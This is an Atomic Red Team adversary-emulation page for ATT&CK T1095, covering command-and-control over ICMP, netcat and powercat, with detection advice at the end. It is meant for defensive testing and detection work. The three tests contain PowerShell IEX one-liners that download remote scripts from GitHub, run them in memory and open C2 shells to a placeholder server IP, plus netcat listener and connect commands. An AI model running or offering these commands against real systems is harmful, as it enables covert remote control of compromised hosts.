# T1095 - Non-Application Layer Protocol
Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - ICMP C2
This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}
```

Invoke-AtomicTest T1095 -TestNumbers 1

### Atomic Test #2 - Netcat C2
Start C2 Session Using Ncat
To start the listener on a Linux device, type the following: 
nc -l -p <port>

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
cmd /c #{ncat_exe} #{server_ip} #{server_port}
```

Invoke-AtomicTest T1095 -TestNumbers 2

### Atomic Test #3 - Powercat C2
Start C2 Session Using Powercat
To start the listener on a Linux device, type the following: 
nc -l -p <port>

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
```

Invoke-AtomicTest T1095 -TestNumbers 3

## Detection
Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.